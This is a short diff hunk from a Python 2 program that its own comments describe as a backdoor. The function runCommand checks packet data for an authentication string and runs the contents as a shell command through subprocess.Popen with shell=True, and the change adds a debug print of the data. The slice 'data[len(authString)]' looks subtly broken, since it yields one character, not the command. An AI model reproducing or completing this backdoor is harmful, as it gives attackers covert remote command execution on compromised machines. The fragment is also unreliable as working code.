@@ -30,6 +30,7 @@ def runCommand(packet):
   # make sure the data starts with the authString, otherwise it isn't a packet
   # meant for our backdoor and we shouldn't process it
   if data.startswith(authString):
+    print data
     data = data[len(authString)]
     print "Running command " + data
     output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
